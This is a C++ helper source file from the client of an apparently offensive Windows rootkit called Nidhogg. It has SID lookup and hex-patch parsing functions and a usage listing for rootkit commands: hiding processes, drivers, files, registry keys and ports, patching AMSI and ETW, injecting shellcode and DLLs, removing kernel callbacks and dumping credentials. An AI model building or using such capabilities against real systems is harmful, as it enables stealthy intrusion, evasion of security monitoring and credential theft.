#include "Helper.h"

std::wstring GetCurrentUserSID() {
	std::wstring fullUsername = L"";
	WCHAR username[MAX_PATH];
	DWORD usernameSize = MAX_PATH;
	LPWSTR stringSid = nullptr;
	SID_NAME_USE sidUse;
	DWORD sidSize = 0;
	DWORD domainSize = 0;

	if (!GetUserName(username, &usernameSize))
		throw HelperException("Failed to get username");

	if (LookupAccountName(0, username, 0, &sidSize, 0, &domainSize, &sidUse) == 0) {
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			throw HelperException("Failed to lookup account name");
	}

	std::unique_ptr<BYTE[]> sidBuffer = std::make_unique<BYTE[]>(sidSize);
	PSID sid = reinterpret_cast<PSID>(sidBuffer.get());

	if (!sid)
		throw HelperException("Failed to allocate memory for SID");

	std::unique_ptr<WCHAR[]> domain = std::make_unique<WCHAR[]>(domainSize);

	if (!domain)
		throw HelperException("Failed to allocate memory for domain");

	if (LookupAccountName(0, username, sid, &sidSize, domain.get(), &domainSize, &sidUse) == 0)
		throw HelperException("Failed to get SID and domain");

	if (!ConvertSidToStringSid(sid, &stringSid)) {
		return fullUsername;
	}

	std::wstring result(stringSid);
	LocalFree(stringSid);
	return result;
}

std::vector<byte> ConvertToVector(std::wstring rawPatch) {
	int b;
	std::vector<byte> vec;
	std::wstringstream rawPatchStream(rawPatch);
	std::wstringstream byteToAdd;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		byteToAdd << std::hex << i;

		if (rawPatchStream.peek() == L',') {
			rawPatchStream.ignore();
			byteToAdd >> b;
			vec.push_back(b);
			byteToAdd.clear();
		}
	}
	byteToAdd >> b;
	vec.push_back(b);

	return vec;
}

int ConvertToInt(std::wstring rawString) {
	std::wstringstream rawPatchStream(rawString);
	std::wstringstream convertedString;

	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
		convertedString << std::hex << i;
	}

	return _wtoi(convertedString.str().c_str());
}

void PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | unhide | query ] [tid]" << std::endl;
	std::cout << "\tNidhoggClient.exe module [hide] [pid] [module path]" << std::endl;
	std::cout << "\tNidhoggClient.exe driver [hide | unhide] [driver path]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma separated]" << std::endl;
	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
	std::cout << "\tNidhoggClient.exe dump_creds" << std::endl;
	std::cout << "\tNidhoggClient.exe port [hide | unhide | query | clear] [port number] [tcp/udp] [remote/local]" << std::endl;
	std::cout << "\tNidhoggClient.exe exec_script [script_file]" << std::endl;
}